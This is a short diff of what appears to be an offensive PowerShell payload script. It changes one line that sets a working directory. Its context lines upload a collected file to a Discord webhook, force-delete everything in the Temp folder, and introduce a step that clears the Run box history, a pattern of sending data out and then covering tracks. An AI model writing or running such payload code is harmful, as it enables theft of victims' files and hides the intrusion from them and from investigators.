@@ -95,7 +95,7 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $FileName}
 #>
 
 # Delete contents of Temp folder 
-Set-Location -Path "$env:/"
+#Set-Location -Path "$env:/"
 rm $env:temp\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
